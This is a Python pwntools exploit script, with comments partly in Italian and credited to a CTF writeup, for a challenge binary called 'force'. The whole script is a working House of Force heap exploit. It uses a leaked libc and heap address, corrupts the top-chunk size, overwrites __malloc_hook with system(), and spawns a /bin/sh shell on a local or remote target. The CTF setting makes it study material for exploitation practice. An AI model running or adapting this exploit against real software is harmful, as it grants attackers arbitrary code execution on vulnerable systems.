#!/usr/bin/env python3
#2 aprile 2022
#Dal writeup di knittingirl
#https://ctftime.org/writeup/33014

from pwn import *

exe = ELF('force')
libc = ELF(".glibc/glibc_2.28_no-tcache/libc.so.6", checksec=False)

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote("addr", 1337)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

def malloc(size, data):
    io.sendline(b'1')
    io.sendlineafter(b'How many midi-chlorians?: ', str(size))
    io.sendlineafter(b'What do you feel?: ', data)

io = conn()
io.recvuntil(b'You feel a system at ')
leak = io.recvuntil(b'\n')
libc.address = int(leak,16) - libc.sym.system
io.recvuntil(b'You feel something else at ')
heap = io.recvuntil(b'\n')
heap = int(heap,16)
info("Heap base: %#x", heap)
info("Libc adr: %#x", libc.address)

malloc(0x88, b'a' * 0x88 + p64(0xffffffffffffffff)) #Inserendo una size così grande nel top chunk Malloc si estende fin dove vogliamo in memoria 

malloc_hook = libc.sym['__malloc_hook']
distance = malloc_hook - heap - 0x90 - 0x8 - 0x8 - 0x10 #subtracting the size of the allocated chunk (0x90), subtract the additional 8 bytes between the heap base and the start of the first chunk, subtract a further 8 bytes for the chunk size metadata at the start of the new chunk, and then you'll want 0x8 or 0x10 bytes to finish a divisble by 0x10 chunk and account for the size metadata at the start of the new chunk.
info("Malloc_hook:%#x", malloc_hook)

malloc(distance, b'/bin/sh\x00')

malloc(24, p64(libc.sym.system))

binsh = heap + 0x90 + 0x10 #La distanza da heap base dove si trova il nostro chunk con "/bin/sh'
malloc(binsh, b'')

io.interactive()
